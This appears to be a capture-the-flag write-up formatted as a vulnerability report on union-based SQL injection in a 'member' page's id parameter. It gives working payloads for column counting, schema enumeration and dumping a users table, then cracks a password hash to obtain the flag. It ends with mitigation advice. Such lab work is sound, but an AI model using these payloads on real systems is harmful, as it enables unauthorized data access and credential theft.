# Vulnerability Report

## Summary

An SQL Injection was discovered in the parameter `id` in the `member` page.
This vulnerability allows enumeration of the database.

## Vulnerability details

### CWE Reference

- **CWE ID**: [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

### Description
The SQL Injection vulnerability was identified in the id parameter of the member page. This vulnerability allows an attacker to manipulate SQL queries executed by the application. By injecting malicious payloads into the id parameter, it is possible to enumerate database contents, including retrieving table names, column names, and sensitive data.

The application's failure to sanitize or parameterize user input enables this exploitation. During testing, it was observed that the application processes raw input directly into SQL queries, making it susceptible to standard SQL Injection techniques such as UNION queries and data concatenation. This issue is further exacerbated by the lack of any filtering mechanisms to validate input or restrict query results.

### Steps to reproduce
1. Discover the vulnerability by entering `1 OR 1=1`. 
2. Determine the number of columns in the query using `ORDER BY` clause (2 in that case):
    ```sql
    1 ORDER BY 3
    ```
3. Find the current database name:
    ```sql
    1 UNION SELECT DATABASE(), NULL
    ```
    Which is `Member_Sql_Injection` in our case.
4. Enumerate the tables of the current db:
    ```sql
    1 UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE TABLE_SCHEMA = 0x4d656d6265725f53716c5f496e6a656374696f6e
    ```
    We used hex encoded value of the database name because using quotes generate syntax errors.
    The query displays that there is only one table named `users`.
5. Enumerate the columns of the table `users`:
    ```sql
    1 UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273
    ```
    This query showed us the column names: `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`.
6. Retrieve the data from the `users` table:
    ```sql
    1 UNION SELECT CONCAT(user_id,0x7c,first_name,0x7c,last_name,0x7c,town), CONCAT(country,0x7c,planet,0x7c,Commentaire,0x7c,countersign) FROM users
    ```
    Since only two columns are available in our query and there are 8 columns to retrieve we used `CONCAT` to concatenate the columns with a separator between each column.
    As seen in the first query, user 5 contains some interesting information.
7. Decrypt the password using [Crackstation](https://crackstation.net/).
8. Lower the string and get the sha256sum:
    ```bash
    python3 -c "print('FortyTwo'.lower(), end='')" | sha256sum
    ```
9. You got the flag.

### Impact
The SQL Injection vulnerability allows attackers to enumerate the database, exposing sensitive information such as table structures, column names, and user data. This can lead to unauthorized access, data theft, or further exploitation of the application.

## Mitigation
Use parameterized queries or prepared statements to prevent SQL Injection by ensuring user input is properly escaped. Additionally, validate and sanitize all inputs, and apply the principle of least privilege to the database user to restrict access to sensitive data.
## References
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
